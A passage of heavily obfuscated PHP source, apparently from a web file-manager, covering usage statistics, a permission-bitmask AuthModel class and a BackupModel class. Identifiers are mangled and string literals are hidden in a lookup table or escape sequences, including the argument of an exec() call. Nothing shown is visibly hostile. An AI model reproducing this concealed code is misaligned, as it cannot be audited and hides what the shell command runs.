= $¦ã–ƒøê; if ($¬À¿Õ†ç == $Ã½êØ¨—[594]) { $Å±Áâàñ[$Ã½êØ¨—[1738]] = $Å±Áâàñ[$Ã½êØ¨—[1739]] = 0; } } $íÎÜïµĞ[] = $Å±Áâàñ; } $Õ¢œùı¹ = $íÎÜïµĞ; } $ºİ¿¢Ó = array($Ã½êØ¨—[594] => array($Ã½êØ¨—[757] => LNG($Ã½êØ¨—[1754]), $Ã½êØ¨—[1738] => LNG($Ã½êØ¨—[1755]), $Ã½êØ¨—[1739] => LNG($Ã½êØ¨—[1756])), $Ã½êØ¨—[1740] => array($Ã½êØ¨—[755] => LNG($Ã½êØ¨—[1757]), $Ã½êØ¨—[1742] => LNG($Ã½êØ¨—[1758]), $Ã½êØ¨—[1743] => LNG($Ã½êØ¨—[1759]), $Ã½êØ¨—[1744] => LNG($Ã½êØ¨—[1760]))); $Ê“èºâÚ = array($Ã½êØ¨—[594] => $Ã½êØ¨—[1761], $Ã½êØ¨—[1740] => $Ã½êØ¨—[90]); if (empty($Õ¢œùı¹)) { $¦ã–ƒøê = date($Ã½êØ¨—[1745], strtotime($Ã½êØ¨—[1746])); $òØ¯Ûìñ = array($Ã½êØ¨—[229] => $¦ã–ƒøê); foreach ($ºİ¿¢Ó[$¬À¿Õ†ç] as $’Ï¼û¿— => $Ü‹ïŠ€è) { $òØ¯Ûìñ[$’Ï¼û¿—] = 0; } $Õ¢œùı¹[] = $òØ¯Ûìñ; } $æÜÀâ¾Ñ = array(); foreach ($Õ¢œùı¹ as $Ü‹ïŠ€è) { if ($¬À¿Õ†ç == $Ã½êØ¨—[1740] && $Ü‹ïŠ€è[$Ã½êØ¨—[1742]] > $Ü‹ïŠ€è[$Ã½êØ¨—[755]]) { $Ü‹ïŠ€è[$Ã½êØ¨—[1742]] = $Ü‹ïŠ€è[$Ã½êØ¨—[755]]; } foreach ($ºİ¿¢Ó[$¬À¿Õ†ç] as $’Ï¼û¿— => $ãŠ•ç‰¤) { $Å±Áâàñ = array($Ã½êØ¨—[229] => $Ü‹ïŠ€è[$Ã½êØ¨—[229]], $Ã½êØ¨—[1540] => $ãŠ•ç‰¤); $Å±Áâàñ[$Ê“èºâÚ[$¬À¿Õ†ç]] = isset($Ü‹ïŠ€è[$’Ï¼û¿—]) ? $Ü‹ïŠ€è[$’Ï¼û¿—] : 0; $æÜÀâ¾Ñ[] = $Å±Áâàñ; } } return $æÜÀâ¾Ñ; } public function validDate($º‘ğ”Ø, $í„–äü¿) { $ğàÜ¨ÇÍ =& $_SERVER[¹àö™Ç¾]; $úáó²³¦ = date($ğàÜ¨ÇÍ[1745], strtotime($ğàÜ¨ÇÍ[1746])); $ØëÒ¬‘ = array($úáó²³¦); switch ($º‘ğ”Ø) { case $ğàÜ¨ÇÍ[1620]: $‘íÛ’Â˜ = mktime(0, 0, 0, date($ğàÜ¨ÇÍ[1762]), date($ğàÜ¨ÇÍ[1358]) - date($ğàÜ¨ÇÍ[1421]) + 7 - 7, date($ğàÜ¨ÇÍ[1763])); $…Æû±ì§ = 0; do { $¸Îßıî = date($ğàÜ¨ÇÍ[1745], $‘íÛ’Â˜ - 3600 * 24 * 7 * $…Æû±ì§); $ØëÒ¬‘[] = $¸Îßıî; $…Æû±ì§++; } while ($í„–äü¿ < $¸Îßıî); break; case $ğàÜ¨ÇÍ[1618]: $…Æû±ì§ = 1; do { $¥‚ä˜ğ÷ = date($ğàÜ¨ÇÍ[1764], strtotime("\x2d\40{$…Æû±ì§}\x20\x6d\x6f\156\x74\150\163")); $ØëÒ¬‘[] = $¥‚ä˜ğ÷; $…Æû±ì§++; } while ($í„–äü¿ < $¥‚ä˜ğ÷); break; case $ğàÜ¨ÇÍ[1765]: $éúÅ˜äƒ = (int) date($ğàÜ¨ÇÍ[1763], strtotime($í„–äü¿)); $¨ºğ–Ä = (int) date($ğàÜ¨ÇÍ[1763]); if ($éúÅ˜äƒ >= $¨ºğ–Ä) { break; } for ($éúÅ˜äƒ; $éúÅ˜äƒ < $¨ºğ–Ä; $éúÅ˜äƒ++) { $ØëÒ¬‘[] = $éúÅ˜äƒ . $ğàÜ¨ÇÍ[1766]; } break; default: break; } if ($í„–äü¿ > end($ØëÒ¬‘)) { array_pop($ØëÒ¬‘); } sort($ØëÒ¬‘); return $ØëÒ¬‘; } public function listTable($«á“×‹») { $—ø®—ğª = ucfirst($«á“×‹»); return Model($—ø®—ğª)->listData(); } public function option($ğ§ßº‚Ì) { $ª¹¡ôÕ = $_SERVER[¹àö™Ç¾][1767] . ucfirst($ğ§ßº‚Ì); return $this->{$ª¹¡ôÕ}(); } private function optionUser() { $ê¦õ³´Ñ =& $_SERVER[¹àö™Ç¾]; $ãª¼Î›¦ = Model($ê¦õ³´Ñ[538])->count($ê¦õ³´Ñ[1640]); $¹û¹Î = Model($ê¦õ³´Ñ[538])->where($ê¦õ³´Ñ[1768])->count($ê¦õ³´Ñ[1640]); $Ç•®àü© = intval($GLOBALS[$ê¦õ³´Ñ[16]][$ê¦õ³´Ñ[353]][$ê¦õ³´Ñ[1596]]) / 3600; $ç³·ì»ç = strtotime("\x2d{$Ç•®àü©}\x20\x68\x6f\x75\162\163"); $ãâÔ™³ = strtotime(date($ê¦õ³´Ñ[1749])); if ($ç³·ì»ç < $ãâÔ™³) { $ç³·ì»ç = $ãâÔ™³; } $¼û”°ß· = array($ê¦õ³´Ñ[1769] => array($ê¦õ³´Ñ[999], $ç³·ì»ç)); $‹¬©ÂäÓ = (int) Model($ê¦õ³´Ñ[538])->where($¼û”°ß·)->count($ê¦õ³´Ñ[1640]); if (!$‹¬©ÂäÓ) { $‹¬©ÂäÓ = 1; } $¼û”°ß· = array($ê¦õ³´Ñ[1769] => array($ê¦õ³´Ñ[999], $ãâÔ™³)); $ùÓò…ˆÅ = Model($ê¦õ³´Ñ[538])->where($¼û”°ß·)->count($ê¦õ³´Ñ[1640]); return array($ê¦õ³´Ñ[751] => (int) $ãª¼Î›¦, $ê¦õ³´Ñ[1770] => (int) ($ãª¼Î›¦ - $¹û¹Î), $ê¦õ³´Ñ[1771] => (int) $¹û¹Î, $ê¦õ³´Ñ[1772] => (int) $ùÓò…ˆÅ, $ê¦õ³´Ñ[1773] => $‹¬©ÂäÓ); } private function optionFile() { $ÈùöÎÇ– =& $_SERVER[¹àö™Ç¾]; $©ò‡¶ê = $this->sourceSize(); $„¹‰™”Ö = $©ò‡¶ê[$ÈùöÎÇ–[90]]; $Ş’ı¡ÓÙ = $©ò‡¶ê[$ÈùöÎÇ–[1742]]; $•Çà’Â = Model($ÈùöÎÇ–[817])->where(array($ÈùöÎÇ–[411] => 0))->count($ÈùöÎÇ–[403]); $×Ô¥Æ÷• = array($ÈùöÎÇ–[411] => 0, $ÈùöÎÇ–[203] => array($ÈùöÎÇ–[999], strtotime(date($ÈùöÎÇ–[1749])))); $€øæïÑõ = Model($ÈùöÎÇ–[817])->where($×Ô¥Æ÷•)->sum($ÈùöÎÇ–[90]); $ğ¾Š™ì™ = Model($ÈùöÎÇ–[817])->where($×Ô¥Æ÷•)->count($ÈùöÎÇ–[403]); return array($ÈùöÎÇ–[755] => $„¹‰™”Ö, $ÈùöÎÇ–[1742] => $Ş’ı¡ÓÙ, $ÈùöÎÇ–[1774] => $„¹‰™”Ö - $Ş’ı¡ÓÙ, $ÈùöÎÇ–[1775] => (int) $€øæïÑõ, $ÈùöÎÇ–[757] => (int) $•Çà’Â, $ÈùöÎÇ–[1776] => (int) $ğ¾Š™ì™); } private function optionAccess() { $Ë²î¹ßÍ =& $_SERVER[¹àö™Ç¾]; return array($Ë²î¹ßÍ[751] => $this->typeLogCnt(), $Ë²î¹ßÍ[118] => $this->typeLogCnt($Ë²î¹ßÍ[118]), $Ë²î¹ßÍ[450] => $this->typeLogCnt($Ë²î¹ßÍ[450]), $Ë²î¹ßÍ[1777] => $this->typeLogCnt($Ë²î¹ßÍ[1777]), $Ë²î¹ßÍ[1778] => $this->typeLogCnt($Ë²î¹ßÍ[1778]), $Ë²î¹ßÍ[594] => $this->typeLogCnt($Ë²î¹ßÍ[22], $Ë²î¹ßÍ[1753])); } private function typeLogCnt($¾š®¢ì» = '', $“Î‘ØĞ÷ = "\x69\x64") { $¶‚ªİÏ’ =& $_SERVER[¹àö™Ç¾]; $µÒÂŞëÃ = array($¶‚ªİÏ’[118] => array($¶‚ªİÏ’[1779], $¶‚ªİÏ’[1780]), $¶‚ªİÏ’[450] => array($¶‚ªİÏ’[1781], $¶‚ªİÏ’[1782]), $¶‚ªİÏ’[1777] => array($¶‚ªİÏ’[1783], $¶‚ªİÏ’[1784], $¶‚ªİÏ’[1785]), $¶‚ªİÏ’[1778] => array($¶‚ªİÏ’[1786], $¶‚ªİÏ’[1787]), $¶‚ªİÏ’[1788] => array($¶‚ªİÏ’[1789], $¶‚ªİÏ’[1790], $¶‚ªİÏ’[1791])); $©ÈŞç÷î = strtotime(date($¶‚ªİÏ’[1749])); $¢¾£ğŒğ = array($¶‚ªİÏ’[203] => array($¶‚ªİÏ’[999], $©ÈŞç÷î)); if ($¾š®¢ì») { $¢¾£ğŒğ[$¶‚ªİÏ’[43]] = array($¶‚ªİÏ’[17], $µÒÂŞëÃ[$¾š®¢ì»]); } $İÓ®†æ¬ = Model($¶‚ªİÏ’[1752])->where($¢¾£ğŒğ)->count($“Î‘ØĞ÷); return (int) $İÓ®†æ¬; } private function optionServer() { $ÉóØéİñ =& $_SERVER[¹àö™Ç¾]; $Ïçü»é = $this->diskDriver(); $Ğ÷‚Úº› = KodIO::defaultDriver(); $–•ã†Ì¾ = array($ÉóØéİñ[809] => $Ğ÷‚Úº›[$ÉóØéİñ[401]]); $í–´¡Ù = Model($ÉóØéİñ[470])->where($–•ã†Ì¾)->sum($ÉóØéİñ[90]); $¼ÀèŸƒî = explode($ÉóØéİñ[63], $_SERVER[$ÉóØéİñ[150]]); $¢ÊÏÊ¥ = $¼ÀèŸƒî[0]; $€©¬àƒ° = $GLOBALS[$ÉóØéİñ[16]][$ÉóØéİñ[31]]; $¿Äû ±Ø = $€©¬àƒ°[$ÉóØéİñ[961]]; if ($¿Äû ±Ø == $ÉóØéİñ[949]) { $®Ø—´üĞ = explode($ÉóØéİñ[1255], $€©¬àƒ°[$ÉóØéİñ[960]]); $¿Äû ±Ø = $®Ø—´üĞ[0]; } if ($¿Äû ±Ø == $ÉóØéİñ[897] || $¿Äû ±Ø == $ÉóØéİñ[796]) { $ü¢­ ­ = Model()->db()->query($ÉóØéİñ[1792]); $ñÈÕ†Ûæ = $ü¢­ ­[0] && isset($ü¢­ ­[0][$ÉóØéİñ[1539]]) ? $ü¢­ ­[0][$ÉóØéİñ[1539]] : 0; $¿Äû ±Ø = $ÉóØéİñ[1793] . ($ñÈÕ†Ûæ ? $ÉóØéİñ[18] . $ñÈÕ†Ûæ : $ÉóØéİñ[22]); } $æäâÉåœ = $GLOBALS[$ÉóØéİñ[16]][$ÉóØéİñ[353]][$ÉóØéİñ[819]]; return array($ÉóØéİñ[1794] => $Ïçü»é ? $Ïçü»é[$ÉóØéİñ[1795]] : 0, $ÉóØéİñ[1796] => $Ïçü»é ? $Ïçü»é[$ÉóØéİñ[1797]] : 0, $ÉóØéİñ[1798] => (int) $Ğ÷‚Úº›[$ÉóØéİñ[1795]] * 1024 * 1024 * 1024, $ÉóØéİñ[1799] => (int) $í–´¡Ù, $ÉóØéİñ[1800] => ucfirst($¢ÊÏÊ¥), $ÉóØéİñ[1801] => $ÉóØéİñ[1802] . PHP_VERSION, $ÉóØéİñ[1803] => phpBuild64() ? 64 : 32, $ÉóØéİñ[750] => str_replace($ÉóØéİñ[1115], $ÉóØéİñ[977], $¿Äû ±Ø), $ÉóØéİñ[353] => ucfirst($æäâÉåœ), $ÉóØéİñ[42] => $_SERVER[$ÉóØéİñ[1804]]); } private function diskDriver() { $´«ƒöÖ =& $_SERVER[¹àö™Ç¾]; $Óïî¨‘Ó = $´«ƒöÖ[18]; $§âœÚ¿³ = $GLOBALS[$´«ƒöÖ[16]][$´«ƒöÖ[1271]] == $´«ƒöÖ[1272]; if ($§âœÚ¿³) { $Óïî¨‘Ó = $´«ƒöÖ[1805]; if (function_exists($´«ƒöÖ[1806])) { exec($´«ƒöÖ[1807], $ˆ»½®´); $Óïî¨‘Ó = $ˆ»½®´[1] . $´«ƒöÖ[18]; } } if (!file_exists($Óïî¨‘Ó)) { return; } $›§êÁ‡† = @disk_total_space($Óïî¨‘Ó); $–‰Ìß®ß = $›§êÁ‡† - @disk_free_space($Óïî¨‘Ó); return array($´«ƒöÖ[1795] => $›§êÁ‡†, $´«ƒöÖ[1797] => $–‰Ìß®ß); } public function fileChart($Ú¯¨ş¢ª) { $Ğñ‘òüî =& $_SERVER[¹àö™Ç¾]; if (isset($Ú¯¨ş¢ª[$Ğñ‘òüî[1640]])) { return Model($Ğñ‘òüî[817])->userFileTypeProfile($Ú¯¨ş¢ª[$Ğñ‘òüî[1640]]); } if (isset($Ú¯¨ş¢ª[$Ğñ‘òüî[1808]])) { return Model($Ğñ‘òüî[817])->groupFileTypeProfile($Ú¯¨ş¢ª[$Ğñ‘òüî[1808]]); } $‚·Ú—‚“ = $this->sourceSize(); $–©Ú‹Â¾ = array($Ğñ‘òüî[498] => 0, $Ğñ‘òüî[412] => 1); $»ë»ô = Model($Ğñ‘òüî[817])->where($–©Ú‹Â¾)->sum($Ğñ‘òüî[90]); $–©Ú‹Â¾[$Ğñ‘òüî[412]] = 2; $‘„‡É’Ÿ = Model($Ğñ‘òüî[817])->where($–©Ú‹Â¾)->sum($Ğñ‘òüî[90]); return array($Ğñ‘òüî[755] => $‚·Ú—‚“[$Ğñ‘òüî[90]], $Ğñ‘òüî[1742] => $‚·Ú—‚“[$Ğñ‘òüî[1742]], $Ğñ‘òüî[1743] => (int) $»ë»ô, $Ğñ‘òüî[1744] => (int) $‘„‡É’Ÿ); } private function sourceSize() { $ŸÃ«Öã† =& $_SERVER[¹àö™Ç¾]; $¥úä’Ù¯ = Model($ŸÃ«Öã†[817])->where(array($ŸÃ«Öã†[411] => 0))->sum($ŸÃ«Öã†[90]); $Ã‰Ç®«Í = Model($ŸÃ«Öã†[470])->sum($ŸÃ«Öã†[90]); if ($Ã‰Ç®«Í > $¥úä’Ù¯) { $Ã‰Ç®«Í = $¥úä’Ù¯; } return array($ŸÃ«Öã†[90] => (int) $¥úä’Ù¯, $ŸÃ«Öã†[1742] => (int) $Ã‰Ç®«Í); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $—ç‚Ú =& $_SERVER[¹àö™Ç¾]; $”Ô˜ƒ±ä = array(array($—ç‚Ú[421] => LNG($—ç‚Ú[1809]), $—ç‚Ú[1810] => $—ç‚Ú[1811], $—ç‚Ú[1812] => 1, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ç‚Ú[421] => LNG($—ç‚Ú[1815]), $—ç‚Ú[1810] => $—ç‚Ú[1816], $—ç‚Ú[1812] => 2, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ç‚Ú[421] => LNG($—ç‚Ú[1817]), $—ç‚Ú[1810] => $—ç‚Ú[1818], $—ç‚Ú[1812] => 3, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($—ç‚Ú[421] => LNG($—ç‚Ú[1819]), $—ç‚Ú[1810] => $—ç‚Ú[1820], $—ç‚Ú[1812] => 4, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_VIEW), array($—ç‚Ú[421] => LNG($—ç‚Ú[1821]), $—ç‚Ú[1810] => $—ç‚Ú[1822], $—ç‚Ú[1812] => 5, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($—ç‚Ú[421] => LNG($—ç‚Ú[1823]), $—ç‚Ú[1810] => $—ç‚Ú[1824], $—ç‚Ú[1812] => 6, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($—ç‚Ú[421] => LNG($—ç‚Ú[1825]), $—ç‚Ú[1810] => $—ç‚Ú[1826], $—ç‚Ú[1812] => 7, $—ç‚Ú[1813] => 1, $—ç‚Ú[1814] => 0)); return $”Ô˜ƒ±ä; } public static function authCheck($®ŠÚöı, $¸¬€–úò) { $®ŠÚöı = intval($®ŠÚöı); if ($GLOBALS[$_SERVER[¹àö™Ç¾][505]]) { return !0; } if ($®ŠÚöı <= 0) { return !1; } if (($®ŠÚöı & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($®ŠÚöı & $¸¬€–úò); } public static function authCheckShow($©ÜŞ¨»­) { return self::authCheck($©ÜŞ¨»­, self::AUTH_SHOW); } public static function authCheckView($•»ÄØÎß) { return self::authCheck($•»ÄØÎß, self::AUTH_VIEW); } public static function authCheckDownload($¿Ğ®ë˜ê) { return self::authCheck($¿Ğ®ë˜ê, self::AUTH_DOWNLOAD); } public static function authCheckUpload($°ÅíâÔ”) { return self::authCheck($°ÅíâÔ”, self::AUTH_UPLOAD); } public static function authCheckEdit($§…ˆı) { return self::authCheck($§…ˆı, self::AUTH_EDIT); } public static function authCheckRemove($£Ğ¬‚¿­) { return self::authCheck($£Ğ¬‚¿­, self::AUTH_REMOVE); } public static function authCheckShare($ß»Ä®¹â) { return self::authCheck($ß»Ä®¹â, self::AUTH_SHARE); } public static function authCheckComment($ÌËù„äÚ) { return self::authCheck($ÌËù„äÚ, self::AUTH_COMMENT); } public static function authCheckEvent($—ÜÂ¿şß) { return self::authCheck($—ÜÂ¿şß, self::AUTH_EVENT); } public static function authCheckRoot($úÅË¶Ï) { return self::authCheck($úÅË¶Ï, self::AUTH_ROOT); } public static function authCheckAction($ñÜ©‡Åˆ, $ÁßóÎ¹ó) { $ÑŒ“šò =& $_SERVER[¹àö™Ç¾]; $Œ°Óí • = array($ÑŒ“šò[1827] => self::AUTH_VIEW, $ÑŒ“šò[1182] => self::AUTH_DOWNLOAD, $ÑŒ“šò[118] => self::AUTH_UPLOAD, $ÑŒ“šò[1778] => self::AUTH_EDIT, $ÑŒ“šò[1777] => self::AUTH_REMOVE, $ÑŒ“šò[1788] => self::AUTH_SHARE, $ÑŒ“šò[358] => self::AUTH_COMMENT, $ÑŒ“šò[1628] => self::AUTH_EVENT, $ÑŒ“šò[1828] => self::AUTH_ROOT); if (!isset($Œ°Óí •[$ÁßóÎ¹ó])) { return; } $ŒŠÊâ = $Œ°Óí •[$ÁßóÎ¹ó]; $ñÜ©‡Åˆ = intval($ñÜ©‡Åˆ); if ($ñÜ©‡Åˆ <= 0) { return !1; } if (($ñÜ©‡Åˆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ñÜ©‡Åˆ & $ŒŠÊâ); } public static function authDisable($ˆìşÊÌø, $ŠØšŸŒ¥) { if (intval($ˆìşÊÌø) <= 0) { return 0; } return intval($ˆìşÊÌø) & ~$ŠØšŸŒ¥; } public $optionType = "\123\171\x73\164\x65\155\x2e\163\157\x75\162\143\145\101\x75\164\x68\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\141\165\x74\x68", "\x6c\x61\142\145\x6c", "\x64\151\x73\160\x6c\x61\x79", "\163\x79\x73\164\145\x6d", "\x73\x6f\162\164"); public function initData() { $˜ûÅôä… = $this->authDefault(); foreach ($˜ûÅôä… as $ó²ëÅÛ) { $this->add($ó²ëÅÛ); } } public function findAuth($Ù‡¢À¦¾, $¤Ä‰’¼¹) { $Âœ‰¿ÄĞ =& $_SERVER[¹àö™Ç¾]; $Øø–™Ş» = parent::listData(); foreach ($Øø–™Ş» as $“üÇ“È‚) { $·üÓ¦­ = intval($“üÇ“È‚[$Âœ‰¿ÄĞ[414]]); if ($·üÓ¦­ <= 0 || $“üÇ“È‚[$Âœ‰¿ÄĞ[1829]] == 0) { continue; } if (($·üÓ¦­ & $Ù‡¢À¦¾) != $Ù‡¢À¦¾) { continue; } if (($·üÓ¦­ & $¤Ä‰’¼¹) != 0) { continue; } return $“üÇ“È‚[$Âœ‰¿ÄĞ[401]]; } return !1; } public function findAuthReadOnly() { $ÌİöûÇÛ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÛŞê£¿¯ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÌİöûÇÛ, $ÛŞê£¿¯); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($ÖúÜÖèï = false, $¶îîø×ß = "\x73\157\162\x74", $§İ¤ó² = false) { return parent::listData($ÖúÜÖèï, $¶îîø×ß, $§İ¤ó²); } public function update($Í­ªì¸, $¤üÎ‚ùû) { $ç‹È¯‚ =& $_SERVER[¹àö™Ç¾]; $˜ƒÊÂå¡ = parent::listData($Í­ªì¸); $Ÿó®ˆ¸Ø = $this->findByName($¤üÎ‚ùû[$ç‹È¯‚[42]]); if (!$˜ƒÊÂå¡ || $Ÿó®ˆ¸Ø && $Ÿó®ˆ¸Ø[$ç‹È¯‚[401]] != $˜ƒÊÂå¡[$ç‹È¯‚[401]]) { return !1; } $this->filterAuth($¤üÎ‚ùû[$ç‹È¯‚[414]]); return parent::update($Í­ªì¸, $¤üÎ‚ùû); } public function remove($ş”ğ”÷¸) { $èşù¥£ã = parent::listData($ş”ğ”÷¸); if (!$èşù¥£ã || $èşù¥£ã[$_SERVER[¹àö™Ç¾][1259]]) { return !1; } return parent::remove($ş”ğ”÷¸); } public function add($”âÖ‚Éá = array()) { $¤Äâ÷Îª =& $_SERVER[¹àö™Ç¾]; if ($this->findByName($”âÖ‚Éá[$¤Äâ÷Îª[42]])) { return !1; } $ƒÏòŒ± = array($¤Äâ÷Îª[42] => $¤Äâ÷Îª[22], $¤Äâ÷Îª[414] => 1, $¤Äâ÷Îª[1830] => $¤Äâ÷Îª[1818], $¤Äâ÷Îª[1829] => 1, $¤Äâ÷Îª[1259] => 0, $¤Äâ÷Îª[1831] => 0); $”âÖ‚Éá = array_merge($ƒÏòŒ±, $”âÖ‚Éá); $”âÖ‚Éá[$¤Äâ÷Îª[1831]] = $this->getSort(); $this->filterAuth($”âÖ‚Éá[$¤Äâ÷Îª[414]]); return parent::insert($”âÖ‚Éá); } private function getSort() { $çŸúË™â =& $_SERVER[¹àö™Ç¾]; $Ş´«ÅôÜ = parent::listData(); $«ÊÇöéî = array_to_keyvalue($Ş´«ÅôÜ, $çŸúË™â[22], $çŸúË™â[1831]); return empty($«ÊÇöéî) ? 0 : max($«ÊÇöéî) + 1; } private function filterAuth(&$‚ñÖ˜¾) { if (!$‚ñÖ˜¾) { return; } $ ”Í¦í» = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Øöæş«¢ = array(); foreach ($ ”Í¦í» as $¥úÙ€ğİ) { if ($‚ñÖ˜¾ & $¥úÙ€ğİ) { $Øöæş«¢[] = $¥úÙ€ğİ; } } if (in_array(self::AUTH_ROOT, $Øöæş«¢)) { $‚ñÖ˜¾ = array_sum($ ”Í¦í»); return; } $‘£­æ­· = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Øöæş«¢ as $¥úÙ€ğİ) { if (isset($‘£­æ­·[$¥úÙ€ğİ])) { $Øöæş«¢ = array_merge($Øöæş«¢, $‘£­æ­·[$¥úÙ€ğİ]); } } $Øöæş«¢[] = self::AUTH_SHOW; $‚ñÖ˜¾ = array_sum(array_unique($Øöæş«¢)); } public function sort($£€Êí÷, $¤¹ş¬¬­) { return parent::update($£€Êí÷, $¤¹ş¬¬­); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x62\141\143\x6b\165\160\114\151\x73\164"; public $field = array("\x69\x6f", "\156\141\x6d\x65", "\x73\x74\x61\164\165\163", "\143\x6f\x6e\164\145\156\164", "\x6d\x61\x6e\165\x61\x6c", "\162\x65\x73\x75\x6c\164", "\164\151\155\x65\x46\x72\157\155", "\x74\151\155\145\124\157"); public function config() { $ı²¹’¿² =& $_SERVER[¹àö™Ç¾]; $õÈï¯·Ã = Model($ı²¹’¿²[762])->get($ı²¹’¿²[772]); $õÈï¯·Ã = json_decode($õÈï¯·Ã, !0); $õÈï¯·Ã = is_array($õÈï¯·Ã) ? $õÈï¯·Ã : array(); if (!isset($õÈï¯·Ã[$ı²¹’¿²[747]])) { $õÈï¯·Ã[$ı²¹’¿²[747]] = $ı²¹’¿²[99]; } unset($õÈï¯·Ã[$ı²¹’¿²[1610]]); Action($ı²¹’¿²[1832])->taskInit(); Model($ı²¹’¿²[1609])->cacheClear(); $ÀÚ½şØÜ = $ı²¹’¿²[1833]; $‚àø©Üı = Model($ı²¹’¿²[1834])->findByKey($ı²¹’¿²[1628], $ÀÚ½şØÜ); if (!$‚àø©Üı) { $‚àø©Üı = array(); } if (isset($‚àø©Üı[$ı²¹’¿²[206]])) { $‚àø©Üı[$ı²¹’¿²[206]] = json_decode($‚àø©Üı[$ı²¹’¿²[206]], !0); } if (isset($õÈï¯·Ã[$ı²¹’¿²[206]])) { $‚àø©Üı[$ı²¹’¿²[206]][$ı²¹’¿²[1613]] = $õÈï¯·Ã[$ı²¹’¿²[206]]; unset($õÈï¯·Ã[$ı²¹’¿²[206]]); } return array_merge($‚àø©Üı, $õÈï¯·Ã); } public function listData($±ùÈ«Êİ = false, $€ç‹ÁÃ„ = "\155\x6f\x64\x69\x66\x79\x54\151\x6d\x65", $øÁ‡¤†á = false) { return parent::listData($±ùÈ«Êİ, $€ç‹ÁÃ„, !0); } public function lastItem() { $ÀâÑŞÍÛ = $this->listData(); return !empty($ÀâÑŞÍÛ[0]) ? $ÀâÑŞÍÛ[0] : null; } public function kill($ÉÈëä˜Ç) { $ŸŠ¹¿ƒæ =& $_SERVER[¹àö™Ç¾]; $Ë¦°Ï± = $this->listData($ÉÈëä˜Ç); if (!$Ë¦°Ï± || empty($Ë¦°Ï±[$ŸŠ¹¿ƒæ[42]])) { return !0; } Task::kill($ŸŠ¹¿ƒæ[771]); Task::kill($ŸŠ¹¿ƒæ[792]); Task::kill($ŸŠ¹¿ƒæ[801]); $„Ò®º = $Ë¦°Ï±[$ŸŠ¹¿ƒæ[42]]; $ä†ß£‡Ÿ = TEMP_FILES . $ŸŠ¹¿ƒæ[770] . $„Ò®º . $ŸŠ¹¿ƒæ[18]; IO::remove($ä†ß£‡Ÿ, !1); return $this->remove($ÉÈëä˜Ç); } public function remove($«¶çÔ¦) { $œœÁòıŠ = $this->listData($«¶çÔ¦); if (!$œœÁòıŠ) { return !0; } return $this->backupRemove($œœÁòıŠ); } private function backupRemove($Ÿ«çûš) { parent::remove($Ÿ«çûš[$_SERVER[¹àö™Ç¾][401]]); $¦úù®˜ = $this->backupPath($Ÿ«çûš); IO::remove($¦úù®˜, !1); return !0; } private function backupPath($ŸÑƒ˜‰ò) { $¥¾õúµ† =& $_SERVER[¹àö™Ç¾]; $ü¿ÜÍñÌ = $ŸÑƒ˜‰ò[$¥¾õúµ†[42]]; $—À–Ò²í = Model($¥¾õúµ†[762])->get($¥¾õúµ†[763]); $¥–Ò‡Í = substr(md5($¥¾õúµ†[764] . $—À–Ò²í . $ü¿ÜÍñÌ), 0, 8); return "\173\x69\157\x3a{$ŸÑƒ˜‰ò[$¥¾õúµ†[744]]}\175\57\144\141\x74\x61\142\141\163\x65\57\x62\x61\143\153\x75\160\x2f" . $ü¿ÜÍñÌ . $¥¾õúµ†[21] . $¥–Ò‡Í; } public function start() { $ŸéÇòç  =& $_SERVER[¹àö™Ç¾]; if ($GLOBALS[$ŸéÇòç [16]][$ŸéÇòç [100]][$ŸéÇòç [1835]] != $ŸéÇòç [99]) { return !0; } $ç‰ÔÇú = $this->config(); if (!$ç‰ÔÇú || $ç‰ÔÇú[$ŸéÇòç [1610]] != $ŸéÇòç [99]) { return !1; } $…¿£Ì™ê = $this->process(); foreach ($…¿£Ì™ê as $ªĞÂœ»ğ) { 